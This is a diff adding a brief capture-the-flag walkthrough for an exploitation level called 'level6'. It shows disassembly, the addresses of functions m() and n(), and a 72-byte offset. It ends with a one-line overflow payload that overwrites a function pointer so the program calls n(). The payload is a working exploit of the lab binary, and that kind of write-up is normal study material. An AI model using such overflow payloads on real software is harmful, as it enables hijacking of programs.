@@ -1,0 +1,20 @@
+disas main:
+0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
+0x080484ca <+78>:    mov    0x18(%esp),%eax
+0x080484ce <+82>:    mov    (%eax),%eax
+0x080484d0 <+84>:    call   *%eax
+
+Setting a breakpoint at 0x080484d0, we notice that :
+$eax = 0x8048468 which is a call to function m()
+
+i func:
+0x08048454  n
+0x08048468  m
+
+
+The goal here is to replace the call to m() by a call to n() :
+
+The offset at which we can write is 72.
+
+./level6 `python -c "print 'A' * 72 + '\x54\x84\x04\x08'"`
+
